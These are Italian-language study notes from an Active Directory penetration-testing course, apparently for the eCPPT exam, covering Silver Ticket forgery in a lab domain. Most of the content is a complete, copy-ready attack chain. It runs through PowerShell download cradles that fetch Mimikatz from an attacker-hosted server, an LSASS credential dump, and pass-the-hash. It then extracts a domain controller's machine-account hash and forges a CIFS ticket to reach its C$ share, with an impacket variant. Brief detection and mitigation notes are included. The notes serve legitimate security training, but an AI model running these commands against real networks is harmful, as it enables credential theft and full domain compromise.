# 015 — AD Persistence: Silver Ticket (Active Directory Penetration Testing)

> **Modulo:** Active Directory Penetration Testing · **Video:** 15/15
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [015_AD Persistence_ Silver Ticket.txt](015_AD Persistence_ Silver Ticket.txt) · [015_AD Persistence_ Silver Ticket.srt](015_AD Persistence_ Silver Ticket.srt)

## Concetti chiave

- **Silver Ticket** = **TGS forgiato** per **uno specifico servizio** su uno specifico host, cifrato con l'**NTLM hash dell'account del servizio** (computer account o user service account).
- A differenza del Golden Ticket, **NON interagisce con il KDC** → più **stealth** (nessun evento sul DC).
- Scope **limitato**: un servizio (es. `CIFS` per share SMB, `HTTP` per IIS, `MSSQLSvc`, `LDAP`, `HOST` per gestione remota).
- Prerequisito: **NTLM hash dell'account che ospita il servizio** + **SID dominio**.
- Per servizi su computer (come `CIFS`) serve l'hash del **computer account** (es. `PROD$`); per servizi che girano sotto user account serve l'hash di quell'utente.
- Lab dimostrato: forgia silver ticket per **`CIFS/prod.research.security.local`** usando l'hash del computer account `PROD` → accesso al `C$` del DC.

## Spiegazione approfondita

### Cos'è un Silver Ticket
Il TGS in Kerberos è cifrato con la **long-term key dell'account del servizio** (vedi video 04). Il servizio target lo riceve, lo decifra con la propria chiave, legge il PAC e fida del suo contenuto **senza chiamare il KDC** (la PAC validation è opzionale e di default disabilitata). Se possiedi l'hash di quell'account, puoi **scrivere un TGS valido** che afferma "questo utente è membro di Domain Admins, fagli fare quello che vuole".

### Perché Silver invece di Golden
| Aspetto | Silver Ticket | Golden Ticket |
|---|---|---|
| Ticket | TGS (per un servizio) | TGT (master) |
| Chiave | NTLM hash del **service/computer account** | NTLM hash di **KRBTGT** |
| Scope | Singolo servizio su singolo host | Intero dominio |
| KDC coinvolto | **No** | Sì (presenti il TGT per ottenere TGS) |
| Detection sul DC | **Bassissima** (nessun evento) | Alta (eventi 4769 anomali) |
| Lifetime default | 10 anni (Mimikatz) | 10 anni (Mimikatz) |
| Caso d'uso | Persistence stealth su un servizio target | Dominance totale del dominio |

### SPN class names rilevanti
| Service class | Cosa permette |
|---|---|
| `CIFS` | Accesso share SMB (file server) |
| `HOST` | Praticamente "tutto" su quel computer (scheduled tasks, services) |
| `HTTP` | Servizi web (IIS, WinRM) |
| `LDAP` | Query AD / DCSync se DC |
| `MSSQLSvc` | SQL Server |
| `RPCSS` | RPC / WMI |

Per WinRM/PSRemoting tipicamente serve `HOST` + `HTTP`. Per share SMB basta `CIFS`.

### Scenario del lab — Chain completa
```
[student@client]
 └─ Find-LocalAdminAccess → seclogs
     └─ Enter-PSSession seclogs (admin)
          └─ IEX Invoke-TokenManipulation.ps1 + Invoke-Mimikatz.ps1 (via HFS)
               └─ Invoke-TokenManipulation -Enumerate    (Administrator loggato, type 2)
                    └─ Mimikatz sekurlsa::logonpasswords
                         └─ Dump NTLM Administrator
                              └─ (new shell as Admin) sekurlsa::pth Administrator
                                   └─ (process impersonato DA)
                                        └─ lsadump::lsa /inject /name:PROD$
                                             └─ NTLM hash del computer account PROD
                                                  └─ kerberos::golden
                                                        /service:CIFS /target:prod.research.security.local
                                                        /rc4:<HASH_PROD$> /user:Administrator
                                                        /domain /sid /ptt
                                                        └─ klist ✓
                                                             └─ ls \\prod.research.security.local\C$ ✓
```

### Step-by-step (con tutti i dettagli del video)
1. **Setup** PowerShell con PowerView, enum base:
   ```powershell
   powershell -ep bypass
   cd C:\Tools
   . .\PowerView.ps1
   Get-Domain                 # conferma DC = prod.research.security.local
   Get-DomainSID              # ANNOTA - serve per /sid
   ```
2. **Local admin discovery** + remoting:
   ```powershell
   Find-LocalAdminAccess      # -> seclogs
   Enter-PSSession -ComputerName seclogs.research.security.local
   whoami /priv
   ```
3. **HFS su client** ospita `Invoke-TokenManipulation.ps1` e `Invoke-Mimikatz.ps1`.
4. **Su seclogs**:
   ```powershell
   IEX(New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-TokenManipulation.ps1")
   Invoke-TokenManipulation -Enumerate     # vede Administrator (logon type 2)

   IEX(New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-Mimikatz.ps1")
   Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
   # Estrai NTLM Administrator
   ```
5. **Sul client, nuova PowerShell as Admin → PtH come Administrator**:
   ```powershell
   powershell -ep bypass
   cd C:\Tools
   . .\Invoke-Mimikatz.ps1
   Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:research.security.local /ntlm:<ADMIN_NT> /run:powershell.exe"'
   ```
6. **Nella shell impersonata DA, ottieni hash del computer account del DC** con `lsadump::lsa /inject`:
   ```powershell
   cd C:\Tools
   powershell -ep bypass
   . .\Invoke-Mimikatz.ps1
   Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:PROD$"'
   # (variante usata nel video: lsadump::lsa /inject /computer:prod.research.security.local)
   # Annota NTLM hash del computer account "prod" (alias PROD$)
   ```
7. **Baseline access** (deve fallire): `ls \\prod.research.security.local\C$` → Access Denied.
8. **Forgia del Silver Ticket** (`kerberos::golden` con `/service`, NON `/krbtgt`):
   ```powershell
   Invoke-Mimikatz -Command '"kerberos::golden /domain:research.security.local /sid:<DOMAIN_SID> /target:prod.research.security.local /service:CIFS /rc4:<PROD_NT> /user:Administrator /ptt"'
   ```
9. **Verifica**:
   ```powershell
   klist                                          # vede TGS CIFS/prod.research.security.local
   ls \\prod.research.security.local\C$           # ✓ accesso al C$ del DC
   ```

### Note importanti su `kerberos::golden`
Il **comando è lo stesso del Golden Ticket** (`kerberos::golden`), ma con parametri diversi:
- **Golden**: `/krbtgt:<hash>` (no `/service`, no `/target` perché è dominio-wide).
- **Silver**: `/service:<class>` + `/target:<host>` + `/rc4:<hash_service_account>` (no `/krbtgt`).

Mimikatz usa `kerberos::golden` per entrambi perché il meccanismo di forgia è identico — cambia solo cosa viene firmato.

### Perché serve l'hash di `PROD$` per `CIFS`
Il servizio CIFS gira sotto il computer account del DC (`PROD$`). Il TGS per `CIFS/prod.research.security.local` deve essere cifrato con la chiave di quel computer account. Per servizi user-context (es. MSSQL gestito da un service account) serve invece l'hash di quel user.

## Comandi & strumenti

| Comando | Scopo | Note |
|---|---|---|
| `Get-DomainSID` | Estrae SID dominio | Serve come `/sid` |
| `Find-LocalAdminAccess` | Trova host dove sei admin | Pivot iniziale |
| `Invoke-TokenManipulation -Enumerate` | Enum token / utenti loggati | Logon type 2 = interactive |
| `Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'` | Dump LSASS | Sintassi corretta richiede ogni comando in `""` separato dentro `'...'` |
| `Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:<d> /ntlm:<h> /run:powershell.exe"'` | Pass-the-Hash spawn | Vedi video 012 |
| `Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:<COMP>$"'` | Estrae hash di un account specifico dall'LSA | Serve admin sul DC (o PtH come DA per leggerlo remoto) |
| `Invoke-Mimikatz -Command '"kerberos::golden /domain /sid /target /service /rc4 /user /ptt"'` | Forgia + inject Silver Ticket | Sintassi esatta del lab |
| `klist` | Verifica TGS iniettato | Cerca server = `<service>/<target>` |
| `klist purge` | Cancella ticket cached | Utile in caso di errore |
| `ls \\<DC>\C$` | Test accesso CIFS | Conferma successo |

## Esempi pratici

```powershell
# === Setup foothold ===
powershell -ep bypass
cd C:\Tools
. .\PowerView.ps1
Get-Domain
Get-DomainSID                 # ANNOTA: S-1-5-21-...
Find-LocalAdminAccess         # -> seclogs

# === Remoting al pivot ===
Enter-PSSession -ComputerName seclogs.research.security.local
whoami /priv

# === Dal pivot: dump credenziali admin loggato ===
IEX(New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-TokenManipulation.ps1")
Invoke-TokenManipulation -Enumerate

IEX(New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
# Annota NTLM Administrator

Exit-PSSession

# === Sul client, nuova shell as Admin: PtH come DA ===
powershell -ep bypass
cd C:\Tools
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:research.security.local /ntlm:<ADMIN_NT> /run:powershell.exe"'

# === Nella shell DA: estrai hash computer account del DC ===
cd C:\Tools
powershell -ep bypass
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:PROD$"'
# Annota NTLM di PROD$

# Baseline: confermare che NON hai accesso
ls \\prod.research.security.local\C$    # Access denied

# === Forgia Silver Ticket per CIFS del DC ===
Invoke-Mimikatz -Command '"kerberos::golden /domain:research.security.local /sid:<DOMAIN_SID> /target:prod.research.security.local /service:CIFS /rc4:<PROD_NT> /user:Administrator /ptt"'

# === Verifica ===
klist
ls \\prod.research.security.local\C$    # ✓ accesso
```

```bash
# Alternative cross-platform (impacket)
# 1. Recupera hash computer account via DCSync (se DA)
impacket-secretsdump research.security.local/Administrator@<DC_IP> -hashes :<ADMIN_NT> -just-dc-user 'PROD$'

# 2. Forgia silver ticket
impacket-ticketer -nthash <PROD_NT> -domain-sid <DOMAIN_SID> -domain research.security.local \
                  -spn cifs/prod.research.security.local Administrator

# 3. Usa il ticket
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass research.security.local/Administrator@prod.research.security.local
```

## Punti d'attenzione per l'esame eCPPT

- **Chiave per il Silver Ticket** = NTLM hash dell'**account del servizio** (computer account per CIFS/HOST/HTTP/LDAP su un host; user account per service che girano sotto user).
- **Per CIFS sul DC** servono hash di `PROD$` (cioè `<DCNAME>$`). Computer account end con `$`.
- Il Silver Ticket **non passa per il KDC** → nessun evento sul DC → più stealth del Golden.
- **Pitfall comune**: la PAC validation è OPZIONALE di default; il servizio si fida del PAC del ticket. Ecco perché un Silver con `/user:Administrator /groups:512` ottiene DA-like access su quel servizio.
- **Stessa funzione `kerberos::golden`** per entrambi i ticket, ma parametri diversi:
  - Golden = `/krbtgt:<KRBTGT_NT>` (no service/target).
  - Silver = `/service:<class>` + `/target:<host>` + `/rc4:<service_NT>` (no krbtgt).
- **Comando per dumpare un singolo account hash**: `lsadump::lsa /inject /name:<account>` (o `/computer:<host>`). Necessita admin/DCSync.
- **Service class names** da memorizzare per i lab: `CIFS, HOST, HTTP, LDAP, MSSQLSvc, RPCSS, TIME, WSMAN`.
- Per **WinRM/PSRemoting** servono tipicamente DUE silver ticket: `HOST` e `HTTP`.
- **Lifetime default Mimikatz** = 10 anni → flag tipico per detection (TGS con lifetime anomalo).
- **Mitigazione**: ruotare regolarmente la password dei computer account critici (di default ogni 30 giorni, ma spesso disabilitato sui DC). Per Silver basato su user service account: cambiare la password del service account.
- **Differenza chiave Golden vs Silver vs PtT** (combo domanda likely):
  - **PtT** = ticket **rubato** legittimo (TGT o TGS).
  - **Silver** = TGS **forgiato** per un servizio.
  - **Golden** = TGT **forgiato** master.

## Collegamenti con altri video

- Precedente: [[014_AD Persistence_ Golden Ticket]]
- Teoria TGS / chiave service account: [[04_Active Directory Authentication]]
- Origine dell'hash service via Kerberoasting: [[011_Kerberoasting]]
- Setup PtH per arrivare a poter dumpare hash service account: [[012_AD Lateral Movement_ Pass-the-Hash]]
- Pass-the-Ticket per riusare ticket reali invece di forgiarli: [[013_AD Lateral Movement_ Pass-the-Ticket]]
- Identificazione di service account/computer e SPN: [[09_AD Enumeration_ PowerView]] · [[08_AD Enumeration_ BloodHound]]
- Methodology (Silver/Golden nella fase Persistence): [[06_AD Penetration Testing Methodology]]
